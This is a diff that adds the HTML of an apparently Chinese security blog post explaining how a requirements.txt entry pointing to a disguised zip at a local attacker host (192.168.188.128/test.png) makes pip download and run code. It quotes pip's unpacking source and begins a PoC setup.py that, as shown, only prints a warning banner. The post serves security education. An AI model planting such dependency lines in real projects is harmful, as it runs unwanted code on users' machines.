@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html><head>
+<title>利用pip下载并执行恶意代码的姿势</title>
+
+
+
+
+<meta charset="utf-8">
+<meta name="X-UA-Compatible" content="IE=edge">
+<meta name="google-site-verification" content="">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+<meta content="telephone=no" name="format-detection">
+<meta name="description" content="她在RCE你!">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<meta property="og:title" content="利用pip下载并执行恶意代码的姿势" />
+<meta property="og:description" content="她在RCE你!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://me0w00f.github.io/posts/pip/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-13T11:57:09+08:00" />
+<meta property="article:modified_time" content="2022-11-13T11:57:09+08:00" /><meta property="og:site_name" content="My Blog" />
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="利用pip下载并执行恶意代码的姿势"/>
+<meta name="twitter:description" content="她在RCE你!"/>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/journal.min.c5d92f380bf10f6849c7ac487c7df2b22c081e0851e5339224f1ae29210b20d2.css" integrity="sha256-xdkvOAvxD2hJx6xIfH3ysiwIHghR5TOSJPGuKSELINI=" media="screen">
+
+
+
+<link rel="stylesheet" href="/scss/dark-mode.min.9f8d8c2df9285089d141edd4a50cb7506c7948e6ab79a29968dced1bd0ab7d22.css" integrity="sha256-n42MLfkoUInRQe3UpQy3UGx5SOareaKZaNztG9CrfSI=" media="screen">
+
+
+
+
+      <script src="/js/toc.js"></script>
+    
+    <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css"><link rel="stylesheet"
+          href="https://fonts.googleapis.com/css?family=Material+Icons">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+    	<div id="app"><div id="sideContainer" class="side-container">
+    
+    <a class="a-block nav-head false" href="https://me0w00f.github.io/">
+    
+        <div class="nav-title">
+            Me0w00f Security 
+        </div>
+        
+        <div class="nav-subtitle">
+            We are me0w00f security~
+        </div>
+        
+    </a>
+
+    <div class="nav-link-list">
+        
+        
+            
+            
+            
+                
+            
+            
+            
+            <a class="a-block nav-link-item active" href="/posts">
+                Archive
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/categories">
+                Categories
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/tags">
+                Tags
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/about">
+                About
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/index.xml">
+                RSS Feed
+            </a>
+            
+        
+    </div>
+
+    
+
+    <div class="nav-footer">
+        
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
+<br>
+移植自 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	Copyleft 2022 Me0w00f Security
+	
+
+    </div>
+    
+</div><div id="extraContainer" class="extra-container">
+    
+    
+    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- 目录 -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e5%85%8d%e8%b4%a3%e5%a3%b0%e6%98%8e" onclick="onNavClick(`#免责声明-nav`)" id="免责声明-nav">
+									免责声明
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%9c%ba%e6%99%af%e6%a8%a1%e6%8b%9f" onclick="onNavClick(`#场景模拟-nav`)" id="场景模拟-nav">
+									场景模拟
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%9c%ac%e8%b4%a8%e5%8e%9f%e7%90%86" onclick="onNavClick(`#本质原理-nav`)" id="本质原理-nav">
+									本质原理
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#poc%e7%bc%96%e5%86%99" onclick="onNavClick(`#poc编写-nav`)" id="poc编写-nav">
+									PoC编写
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%80%9d%e8%80%83" onclick="onNavClick(`#思考-nav`)" id="思考-nav">
+									思考
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#ref" onclick="onNavClick(`#ref-nav`)" id="ref-nav">
+									ref
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%bb%93%e8%af%ad" onclick="onNavClick(`#结语-nav`)" id="结语-nav">
+									结语
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+    
+    <div class="pagination">
+        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
+            <i class="material-icons pagination-action-icon">
+                keyboard_arrow_up
+            </i>
+        </a>
+        
+        <a type="button" class="pagination-action" id="darkModeToggleButton">
+            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
+                dark_mode
+            </span>
+        </a>
+        
+        
+    </div>
+</div>
+<div class="single-column-drawer-container" id="drawer"
+     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
+    <div class="drawer-content">
+        <div class="drawer-menu">
+            
+            
+            
+                
+                
+                
+                    
+                
+                
+                
+                <a class="a-block drawer-menu-item active" href="/posts">
+                    Archive
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/categories">
+                    Categories
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/tags">
+                    Tags
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/about">
+                    About
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/index.xml">
+                    RSS Feed
+                </a>
+                
+            
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- 目录 -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e5%85%8d%e8%b4%a3%e5%a3%b0%e6%98%8e" onclick="onNavClick(`#免责声明-nav`)" id="免责声明-nav">
+									免责声明
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%9c%ba%e6%99%af%e6%a8%a1%e6%8b%9f" onclick="onNavClick(`#场景模拟-nav`)" id="场景模拟-nav">
+									场景模拟
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%9c%ac%e8%b4%a8%e5%8e%9f%e7%90%86" onclick="onNavClick(`#本质原理-nav`)" id="本质原理-nav">
+									本质原理
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#poc%e7%bc%96%e5%86%99" onclick="onNavClick(`#poc编写-nav`)" id="poc编写-nav">
+									PoC编写
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%80%9d%e8%80%83" onclick="onNavClick(`#思考-nav`)" id="思考-nav">
+									思考
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#ref" onclick="onNavClick(`#ref-nav`)" id="ref-nav">
+									ref
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%bb%93%e8%af%ad" onclick="onNavClick(`#结语-nav`)" id="结语-nav">
+									结语
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+            
+        </div>
+    </div>
+</div>
+<transition name="fade">
+    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+</transition>
+<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div id="navBackground" class="nav-background"></div>
+    <div class="container container-narrow nav-content">
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
+            <i class="material-icons">
+                menu
+            </i>
+        </button>
+        <a id="navTitle" class="navbar-brand" href="https://me0w00f.github.io/">
+            Me0w00f Security 
+        </a>
+        
+        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
+            <i class="material-icons" id="darkModeToggleIcon2">
+                dark_mode
+            </i>
+        </button>
+        
+    </div>
+</nav>
+<div class="single-column-header-container" id="pageHead"
+     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
+    <a href="https://me0w00f.github.io/">
+        <div class="single-column-header-title">Me0w00f Security </div>
+        
+        <div class="single-column-header-subtitle">We are me0w00f security~</div>
+        
+
+    </a>
+</div>
+
+            <div id="content">
+                <div id="streamContainer" class="stream-container">
+
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
+                
+            
+
+            <div class="post-head-wrapper"
+                
+                    
+                    
+                    style="background-image: url('https://me0w00f.github.io/images/cover.png')"
+                    
+                
+            >
+                <div class="post-title">
+                    利用pip下载并执行恶意代码的姿势
+                    
+                    <div class="post-subtitle">
+                        她在RCE你!
+                    </div>
+                    
+                    <div class="post-meta">
+                        
+                        <time itemprop="datePublished">
+                            2022-11-13 11:57
+                        </time>
+                        
+
+                        
+                            <i class="material-icons" style="">folder</i>
+                                <a href="/categories/rce">RCE</a>
+                                &nbsp;
+                        
+
+                        
+                            <i class="material-icons" style="">label</i>
+                            
+                                <a href="/tags/%E9%BB%91%E5%AE%A2">黑客</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">网络安全</a>
+                                &nbsp;
+                            
+                                <a href="/tags/pip">pip</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E9%92%93%E9%B1%BC">钓鱼</a>
+                                &nbsp;
+                            
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <p>各位在安装各种python项目的依赖项的时候会不会仔细去看看安装的究竟是什么捏?</p>
+<p>还是更加倾向于直接</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pip install -r requirements.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我相信大部分人肯定倾向于后者 <del>(实际上我在做这个实验之前也是这样)</del></p>
+<p>那么接下来就来一起看看这样&quot;偷懒&quot;的惨痛后果吧 :)
+<img src="/images/test.png" alt="U R WATCHED"></p>
+<h2 id="免责声明">免责声明</h2>
+<p>在阅读以下文章内容前，请阅读以下免责声明</p>
+<blockquote>
+<p>本篇文章内容包含部分带有攻击性的内容, 仅供网络安全技术学习与交流使用</p>
+<p>如有不当使用文章中的技术造成损害的, 后果自负</p>
+<p>文章中的实验均在虚拟环境中进行</p>
+</blockquote>
+<p>所以，请不要搞事情= =</p>
+<h2 id="场景模拟">场景模拟</h2>
+<p>A: 最近有一个好用的<strong>python工具</strong>,有人要试试吗?</p>
+<p>B: 好呀好呀, 速速发我</p>
+<blockquote>
+<p>于是乎, B接受了A发送的工具</p>
+</blockquote>
+<p>A: 对了, 这个工具需要<strong>安装依赖包</strong>,你运行一下这个指令</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pip install -r requirements.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>但是捏, 这个<code>requirements.txt</code>其中加了一点《料》</p>
+</blockquote>
+<pre tabindex="0"><code class="language-url" data-lang="url">http://192.168.188.128/test.png
+</code></pre><blockquote>
+<p>由于B没有检查<code>requirements.txt</code>的内容,直接运行了指令,</p>
+<p>pip就下载并执行了A准备好的恶意的代码</p>
+</blockquote>
+<p>B: 诶? 鼠标怎么自己动起来了???</p>
+<h2 id="本质原理">本质原理</h2>
+<p>我们可以去看一下pip的这段<a href="https://github.com/pypa/pip/blob/d0051d3266ba11e7410a43a040dfd409af88a1db/src/pip/_internal/utils/unpacking.py#L229-L257">源码</a></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unpack_file</span>(
+</span></span><span style="display:flex;"><span>    filename: str,
+</span></span><span style="display:flex;"><span>    location: str,
+</span></span><span style="display:flex;"><span>    content_type: Optional[str] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(filename)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (
+</span></span><span style="display:flex;"><span>        content_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;application/zip&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">or</span> filename<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>endswith(ZIP_EXTENSIONS)
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">or</span> zipfile<span style="color:#f92672">.</span>is_zipfile(filename)
+</span></span><span style="display:flex;"><span>    ):
+</span></span><span style="display:flex;"><span>        unzip_file(filename, location, flatten<span style="color:#f92672">=</span><span style="color:#f92672">not</span> filename<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.whl&#34;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> (
+</span></span><span style="display:flex;"><span>        content_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;application/x-gzip&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">or</span> tarfile<span style="color:#f92672">.</span>is_tarfile(filename)
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">or</span> filename<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>endswith(TAR_EXTENSIONS <span style="color:#f92672">+</span> BZ2_EXTENSIONS <span style="color:#f92672">+</span> XZ_EXTENSIONS)
+</span></span><span style="display:flex;"><span>    ):
+</span></span><span style="display:flex;"><span>        untar_file(filename, location)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># FIXME: handle?</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># FIXME: magic signatures?</span>
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>critical(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Cannot unpack file </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> (downloaded from </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, content-type: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">); &#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;cannot detect archive format&#34;</span>,
+</span></span><span style="display:flex;"><span>            filename,
+</span></span><span style="display:flex;"><span>            location,
+</span></span><span style="display:flex;"><span>            content_type,
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> InstallationError(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Cannot determine archive format of </span><span style="color:#e6db74">{</span>location<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href=""></a></p>
+<p>我们可以发现, pip会解压下载到的压缩包</p>
+<p>因为我们把<code>.zip</code>的压缩包的后缀改成图片并不影响pip的判断,</p>
+<p>所以通过改后缀产生的<strong>伪图片</strong>也会被解压</p>
+<h2 id="poc编写">PoC编写</h2>
+<p>我们先新建一个文件夹, 随便起个名字</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mkdir poc 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进入这个文件夹</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cd poc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>新建一个<code>setup.py</code></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>vi setup.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>按<code>i</code>进入编辑模式并写入如下内容</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 导入time库</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 一个花里胡哨的字符串</span>
+</span></span><span style="display:flex;"><span>msg<span style="color:#f92672">=</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ____ __        __ _   _  _____  ____  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  _ \\ \      / /| \ | || ____||  _ \ 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | |_) |\ \ /\ / / |  \| ||  _|  | | | |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  __/  \ V  V /  | |\  || |___ | |_| |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |_|      \_/\_/   |_| \_||_____||____/ 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --- Don&#39;t use pip to install unknown package...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     This could be some evil scripts...        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 在命令行里显示出花里胡哨的东西</span>
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/tty&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
+</span></span><span style="display:flex;"><span>print(msg, file<span style="color:#f92672">=</span>f)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 暂停三秒</span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
